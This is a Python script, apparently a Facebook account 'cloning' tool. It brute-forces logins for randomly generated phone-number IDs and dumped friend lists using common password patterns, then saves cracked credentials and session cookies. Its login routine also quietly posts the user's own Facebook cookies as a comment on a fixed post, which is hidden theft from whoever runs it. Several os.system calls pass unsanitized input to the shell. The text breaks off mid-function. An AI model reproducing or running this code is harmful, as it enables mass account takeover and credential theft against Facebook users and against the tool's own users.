
from os import path
import os,base64,zlib,pip,urllib
print('\n\033[1;37m install modules...\n It will take some seconds Please Wait...')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestspip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
        os.system('python RAHUL.py')
except:pass
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['Dalvik/2.1.0 (Linux; U; Android 7.1.2; VUVAMINI Build/NHG47L)','Dalvik/2.1.0 (Linux; U; Android 9; HOTREALS Build/PPR1.180610.011)','Dalvik/2.1.0 (Linux; U; Android 11; DECSMART Build/RTT0.211009.001)','Dalvik/2.1.0 (Linux; U; Android 12; T28-EEA Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 11; moto g stylus (XT2115DL) Build/RPCS31.Q2-109-16-16)','Dalvik/2.1.0 (Linux; U; Android 8.1; HOT10 Build/MMB29M)','Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R112-15359.58.0)','Dalvik/2.1.0 (Linux; U; Android 11; Lenovo K12 Pro Build/RZCS31.Q2-57-12-14)','Dalvik/2.1.0 (Linux; U; Android 11; KIVI 4K Android TV Build/RTM5.220609.207)','Dalvik/2.1.0 (Linux; U; Android 10; Lenovo K13 Build/QOJS30.506-7-18)','Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-17-2)','Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a Build/TQ2A.230505.002)','Dalvik/2.1.0 (Linux; U; Android 6.0.1; Z986U Build/MMB29M)','Dalvik/2.1.0 (Linux; U; Android 7.0; 3277 Build/NRD90M)','Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2022) Build/S2ST32.71-118-4)','Dalvik/2.1.0 (Linux; U; Android 13; ASUS_I005DA Build/TKQ1.220807.001)','Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-9-4)','Dalvik/2.1.0 (Linux; U; Android 12; LM-F100N Build/SKQ1.211103.001)','Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ2A.230505.002)','Dalvik/2.1.0 (Linux; U; Android 13; M2012K11C Build/TKQ1.220829.002)','Dalvik/2.1.0 (Linux; U; Android 12; M2101K7BG Build/SP1A.210812.016) VD/229','Dalvik/2.1.0 (Linux; U; Android 11; SM-A202F Build/RP1A.200720.012) VD/233','Dalvik/2.1.0 (Linux; U; Android 9; KFTRWI Build/PS7328.3433N)','Dalvik/2.1.0 (Linux; U; Android 13; V2205 Build/TP1A.220624.014_NONFC)','Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-3)','Dalvik/2.1.0 (Linux; U; Android 13; 2107113SI Build/TKQ1.220829.002)','Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230405.003.E1) ;Pixel 6a','Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.600VZ.0576.a)','Dalvik/2.1.0 (Linux; U; Android 12; SH-M17 Build/S6062)','Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230405.003.A2)','Dalvik/2.1.0 (Linux; U; Android 11; Star 5 Build/RP1A.200720.011)','Dalvik/2.1.0 (Linux; U; Android 13; SM-A037U1 Build/TP1A.220624.014)','Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-7)','Dalvik/2.1.0 (Linux; U; Android 9; Aquaris X Pro Build/PQ3A.190801.002)','Dalvik/2.1.0 (Linux; U; Android 9; Mediatek MT8173 Chromebook Build/R112-15359.58.0)','Dalvik/2.1.0 (Linux; U; Android 13; XQ-CQ72 Build/64.1.A.0.891)','Dalvik/2.1.0 (Linux; U; Android 11; XM-SW1 Build/RP1A.200720.011)','Dalvik/2.1.0 (Linux; U; Android 13; LM-V600 Build/TKQ1.220829.002)','Dalvik/2.1.0 (Linux; U; Android 13; M2101K7AI Build/TQ1A.230105.002)','Dalvik/2.1.0 (Linux; U; Android 13; Nokia G20 Build/TP1A.220624.014)','Dalvik/2.1.0 (Linux; U; Android 13; 22041219PI Build/TP1A.220624.014)','Dalvik/2.1.0 (Linux; U; Android 10.0; B9212A Build/O11019)','Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6826B Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 ultra Build/S3SQS32.16-72-31-3)','Dalvik/2.1.0 (Linux; U; Android 11; M2003J15SC Build/RP1A.200720.011) VD/233','Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) PB/102','Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J415FN Build/M1AJQ) PB/102','Dalvik/2.1.0 (Linux; U; Android 13; DN2101 Build/TP1A.220905.001)','Dalvik/2.1.0 (Linux; U; Android 13; PHB110 Build/TP1A.220905.001)','Dalvik/2.1.0 (Linux; U; Android 12; Helium Pro Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 11; MS5539G Build/RP1A.200720.011)','Dalvik/2.1.0 (Linux; U; Android 10; VRD-W10 Build/HUAWEIVRD-W10)','Dalvik/2.1.0 (Linux; U; Android 9; HP Chromebook x360 11 G1 EE Build/R114-15437.8.0)'
])
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
	
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

logo = ("""\033[1;32m      
  ____  _       ____       _           _ 
 |  _ \| |__   |  _ \ __ _| |__  _   _| |
 | |_) | '_ \  | |_) / _` | '_ \| | | | |
 |  _ <| |_) | |  _ < (_| | | | | |_| | |
 |_| \_\_.__/  |_| \_\__,_|_| |_|\__,_|_|
                                            \033
---------------------------------------------- 
 Author    : RB RAHUL
 Github    : Hackerrv33
 Facebook  : RB RAHUL CMD(RB Brand)
 Status    : Free
 Youtube   : Tech Rahul Rb
 Tool Type : File+Random Cloning
 Version   : 10.9.9
----------------------------------------------
 Note: Use Fligt Mode ON/OFf When Start CMD 
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
        print(logo)
def approval():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/Hackerrv33/rahulrbc/main/server.txt').text
    if id in httpCaht:
      print("\33[1;32mYour Token is Successfully Approved")
      msg = str(os.geteuid())
      time.sleep(0.5)
      clear()
      pass
    else:
      print("Your Token : "+id)
      print('\33[1;37m----------------------------------------------')
      print("\33[1;32mImportant Note-Tool is Free ")
      print("\33[1;37m----------------------------------------------")
      print("\33[1;37mFor One Condition to get Free Register Everyone")
      print('First Subscribe My Youtube Channel And Send Screen Shot')
      print('Send Your Screen Shot and Get Approval Within 5 min')
      print('\33[1;37m----------------------------------------------')
      print ('Register Auto Delete If You Are Unsubscribe My Channel')
      input('IF U WANT Free Approval PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923182155629?text='+tks),approval()
      time.sleep(1)
      menu()
  except:
    sys.exit()        
loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]
def login():
        clear()
        cookies = input(' Put cookies: ')
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://m.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(EAAG\w+)", data.text)
                open(".tok.txt", "w").write(find_token.group(1))
                open(".coki.txt","w").write(cookies)
                tok=open('.tok.txt','r').read()
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cookies}).json()
                name=(info['name'])
                idd=(info['id'])
                barth=(info['birthday'])
                linex()
                print(' Welcome\033[1;32m : '+name)
                print(' \033[1;37mYour UID : '+idd)
                print(' Barth Day: '+barth)
                requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                linex()
                print(' Cookies login has been successfull...')
                time.sleep(1)
                menu()
        except KeyError:
                print('\033[1;31m Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
        except requests.exceptions.ConnectionError:
                exit(' internet connection error...')
        except AttributeError:
                print('\033[1;31m Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
                login()
def public():
        usrr=[]
        clear()
        try:
                tok = open('.tok.txt','r').read()
                cok = open('.coki.txt','r').read()
                tokenku.append(tok)
        except KeyError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        except IOError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        try:
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cok}).json()
                name=(info['name'])
                print('\033[1;32m Welcome '+name)
                linex()
        except KeyError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        try:
                jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;37m '))
        except ValueError:
                exit(' Put only digits not latters ')
        if jum<1 or jum>5000:
                exit()
        ses=requests.Session()
        yz = 0
        for met in range(jum):
                yz+=1
                kl = input(f'\033[1;37m Put link no.{yz+0}: ')
                usrr.append(kl)
        linex()
        print(' Method 1 Working OP ')
        linex()
        print(' [1] Method Updated (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
        linex()
        mthd = input(' Choose method: ')
        linex()
        print(' Do you went show cp account? (y/n): ')
        linex()
        cx=input(' Choose: ')
        if cx in ['y','Y','yes','Yes','1']:
                pcp.append('y')
        else:
                pcp.append('n')
        linex()
        print('\033[1;32m Dumping friend list...\033[1;37m')
        linex()
        for userr in usrr:
                try:
                        col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
                        for mi in col['friends']['data']:
                                try:
                                        iso = (mi['id']+'|'+mi['name'])
                                        if iso in id:pass
                                        else:id.append(iso)
                                except:continue
                except (KeyError,IOError):
                        pass
                except requests.exceptions.ConnectionError:
                        exit(f' No internet connection')
        try:
                plist = []
                try:
                        ps_limit = int(input(' How many passwords do you want to add ? '))
                except:
                        ps_limit =1
                linex()
                print('\033[1;32m exp: first last,firtslast,first123')
                linex()
                for i in range(ps_limit):
                        plist.append(input(f' Put password {i+1}: '))
                with tred(max_workers=30) as crack_submit:
                        clear()
                        total_ids = str(len(id))
                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                        linex()
                        for user in id:
                                ids,names = user.split('|')
                                passlist = plist
                                if mthd in ['1','01']:
                                        crack_submit.submit(ffb,ids,names,passlist)
                                elif mthd in ['2','02']:
                                        crack_submit.submit(api,ids,names,passlist)
                                elif mthd in ['3','03']:
                                        crack_submit.submit(api2,ids,names,passlist)
                                elif mthd in ['3','04']:
                                        crack_submit.submit(api5,ids,names,passlist)        
                                else:
                                        crack_submit.submit(api1,ids,names,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python MAFIA.py')
        except requests.exceptions.ConnectionError:
                exit(f' No internet connection')
        except (KeyError,IOError):
                print(f' No friends for {userr}')
                time.sleep(3)
                public()
def sids():
    os.system('clear')
    print(logo)
    try:
        file_name = input(' Input file name: ')
        open(file_name,'r').read()
    except FileNotFoundError:
        print('\n\033[0;97m  File not found Please Put File Path.......\033[0;97m')
    limit = int(input(' How many links do you want to separate? '))
    print('\n\033[1;33m Example: /sdcard/Rahul.txt\033[0;97m')
    
    new_save = input(' Save new file as: ')
    y = 0
    for k in range(limit):
        y+=1
        links = input(' Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(50*'-')
    print(' Links grabbed successfully')
    print(' Total grabbed links: '+str(len(open(new_save).read().splitlines())))
    print(' New file saved as: '+new_save)
    print(50*'-')
    input('\n Press enter to back ')
    main()
def remove_dub():
    os.system('clear')
    print(logo)
    print(' Dublicate lines remover ...')
    print(50*'-')
    user_file = input(' Put file path: ')
    try:
        open(user_file,'r').read()
        print('\n\033[1;33m Example: /sdcard/filename.txt\033[0;97m')
        save_file = input(' Save new file as: ')
        os.system('touch '+save_file)
        os.system('sort -r '+user_file+' | uniq > '+save_file)
        print(50*'-')
        print(' Dublicate lines has been removed from file')
        print(' Result file saved as: '+save_file)
        print(50*'-')
        input('\n Press enter to back ')
        main()
    except FileNotFoundError:
        print('\n\033[0;97m File not found on provided path, try again ...\033[0;97m')
        print('\n\033[0;97m File not found on provided path, try again ...\033[0;97m')
def menu():
        global lim,tp
       
        try:
                clear()
                sj="server on"
                if "server on" in sj:
                        #clear()
                        print(' [1] File cloning Menu\n [2] File Create Menu\n [3] How to Use Rb Tools\n [4] Join Whatsapp Group\n [0] Exit menu')
                        linex()
                        xd=input(' Choose an option: ')
                        if xd in ['1','01']:
                              clear()
                              print(' [1] File Cloning \n [2] Public cloning (Target Id) \n [3] Random Cloning(Updated)')
                              linex()
                              x=input(' Choose: ')
                              if x in ['1','01']:
                                clear()
                                print(' Put file example:  /sdcard/FileName.txt  etc..')
                                linex()
                                file = input(' Put file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' All Method are Udated Check One By One ')
                                linex()
                                print(' [1] Method 1 (FOR FREHS ID ) \n [2] Method 2 (Fresh New Id) \n [3] Method 3 (Mix Id) \n [4] Method 4 (Old Id) ')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                print(' Select Crack Pass Method');linex();print(' [1] Auto Password Crack \n [2] Choice Password Crack \n [3] First Last Firstlast pass Crack\n [4] Crack with First and Last name ');linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('first123')
                                        plist.append('first@123')
                                        plist.append('first12345')
                                        plist.append('first@12345')
                                elif ppp in ['3','03']:
                                    plist.append("firstlast")
                                    plist.append("first last")
                                    plist.append("First Last")
                                    plist.append("Firstlast")
                                    plist.append("786786")
                                elif ppp in ["4","04"]:
                                    plist.append("firstlast")
                                    plist.append("first last")
                                else:
                                        try:
                                                linex()
                                                ps_limit = int(input(' How many passwords do you want to add ? '))
                                        except:
                                                ps_limit =1
                                        linex()
                                        print('\033[1;32m exp: first last,firtslast,first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f' Put password {i+1}: '))
                                linex()
                                print(' Do you went show cp account? (y/n): ')
                                linex()
                                cx=input(' Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                    pcp.append('n')
                                
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        lim=int(total_ids)
                                        print(f' Total account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod > \033[1;37mM{mthd}')
                            
                                        
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(ffb2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                elif mthd in ['4','04']:
                                                        crack_submit.submit(api2,ids,names,passlist)        
                                                else:
                                                        crack_submit.submit(api,ids,names,passlist)

                                print('\033[1;37m')
    
                                linex()
                                print(' The process has completed')
                                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python RAHUL.py')
                              elif x in ['2','02']:
                                    public()
                              elif x in ['3','03']:
                                clear()
                                print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Afganistan Cloning\n [4] India cloning\n [5] Nepal cloning\n [0] Back menu')
                                linex()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']:
                                    afgan()
                                elif x in ['4','04']:
                                    india()
                                elif x in ['5','05']:
                                    nepal()    
                        
                                else:
                                        menu()       
                        elif xd in ['2','02']:
                                clear()
                                print(' [1] Create File (DumP)\n [2] Remove Double Link\n [3] Separate Link\n [0] Back menu')
                                linex()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                    os.system('python dump.py')
                                elif x in ['2','02']:
                                        remove_dub()
                                elif x in ['3','03']:
                                        sids()
                                else:
                                        menu()
                        elif xd in ['3','03']:
                               wx=('watch?v=koPEi7HXPtk/')
                               os.system(f'xdg-open https://www.youtube.com/{wx}');menu()
                        elif xd in ['4','04']:
                               wx=('Js1oU99b67uGRsaKs88RB7')
                               os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()               
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                                exit(' Option not found in menu...')
                else:
                        print('Will be back soon')


                        linex()
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
                
def pak():
                user=[]
                global lim
                clear()
                print('\033[1;31m Code example: 0306,0315,0335,0345')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                
                with tred(max_workers=30) as RAHUL:     
                        clear()
                        tl = str(len(user))
                        print(' Total ids : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khan12345','khan123','baloch123','pakistan']
                                RAHUL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input(' Press enter to back ')
                os.system('python RAHUL.py')
def bd():
                user=[]
                global lim
                clear()
                print('\033[1;31m Code example: 016,017,018,019')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                
                with tred(max_workers=30) as RAHUL:
                        clear()
                        tl = str(len(user))
                        print(' Total ids : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
                                RAHUL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input(' Press enter to back ')
                os.system('python RAHUL.py')
                
def afgan():

                user=[]
                global lim
                clear()
                print('\033[1;31m Codes: 070, 071, 072, 073, 074, 075, 076, 077, 078, 079')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                
                with tred(max_workers=30) as RAHUL:     
                        clear()
                        tl = str(len(user))
                        print(' Total ids : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        for psx in user:
                                ids = code+psx
                            
                            
                                passlist = [psx,psx[1:],"afgan123",ids,'afgan1122']
                            
                                RAHUL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input(' Press enter to back ')
                os.system('python RAHUL.py')
              
def nepal():



                user=[]
                global lim
                clear()
                print('\033[1;31m Example: 9810,9812,9814,98094,etc')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(10-len(code)))
                        user.append(nmp)
                
                with tred(max_workers=30) as RAHUL:     
                        clear()
                        tl = str(len(user))
                        print(' Total  ids : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        for psx in user:
                                ids = code+psx
                            
                            
                                passlist = [ids[4:],psx,ids,"nepal123","nepal@123","123456","12345678"]
                            
                                RAHUL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input(' Press enter to back ')
                os.system('python RAHUL.py')
def india():



                user=[]
                global lim
                clear()
                print('\033[1;31m Example: ,8765,7548,9,etc')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(10-len(code)))
                        user.append(nmp)
                
                with tred(max_workers=30) as RAHUL:     
                        clear()
                        tl = str(len(user))
                        print(' Total  ids : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        for psx in user:
                                ids = code+psx
                            
                            
                                passlist = [ids[4:],psx,ids,"india123","i love you","123456","12345678"]
                            
                                RAHUL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input(' Press enter to back ')
                os.system('python RAHUL.py')                

def ffb(ids,names,passlist):
        global loop,oks,cps,lim
        p=round(loop*100/lim,2)
        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB M1] %s|\033[1;32mOK:-%s \033[1;37m%s%% \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {                         
                           'authority': 'free.facebook.com',
    'upgrade-insecure-requests': '1',
    'viewport-width': '980',
    'method': 'path',
    'scheme': 'https',                      
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://free.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        RAHUL=str(session.cookies)
                        if "c_user" in RAHUL:
                                print('\r\r\033[1;32m [RAHUL-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/RAHUL-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/RAHUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RAHUL:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1        
def ffb2(ids,names,passlist):
        global loop,oks,cps,lim
